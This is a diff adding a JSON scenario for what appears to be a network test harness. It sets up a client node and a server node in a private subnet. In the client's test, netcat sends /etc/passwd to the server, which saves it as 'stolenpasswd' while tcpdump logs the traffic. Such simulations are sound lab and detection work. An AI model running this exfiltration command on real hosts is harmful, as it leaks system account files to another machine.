@@ -1,0 +1,45 @@
+{
+  "duration" : 10,
+  "env" : { "FOO" : "BAR" },
+  "nodes" : {
+    "client" : {
+      "interfaces" : {
+        "eth0" : {
+          "connection" : { "node" : "server", "interface" : "eth0" },
+          "ip" : "192.168.1.20/24"
+        }
+      },
+      "tests" : [
+        {
+          "cwd" : "/etc",
+          "executable" : "nc 192.168.1.21 5000 < ./passwd",
+          "start" : 2,
+          "duration" : 5
+        }
+      ]
+    },
+    "server" : {
+      "interfaces" : {
+        "eth0" : {
+          "connection" : { "node" : "client", "interface" : "eth0" },
+          "ip" : "192.168.1.21/24"
+        }
+      },
+      "tests" : [
+        {
+          "d" : "/tmp/",
+          "e" : "nc -l -p 5000 >/tmp/stolenpasswd",
+          "s" : 1
+        },
+        {
+          "d" : "/tmp/",
+          "e" : "tcpdump -l -n -i servereth0 > /tmp/tcpdump.log",
+          "s" : 1
+        }
+      ]
+    }
+  },
+  "prepare" : "./prepare.sh",
+  "success" : "./success.sh",
+  "finish" : "./finish.sh"
+}
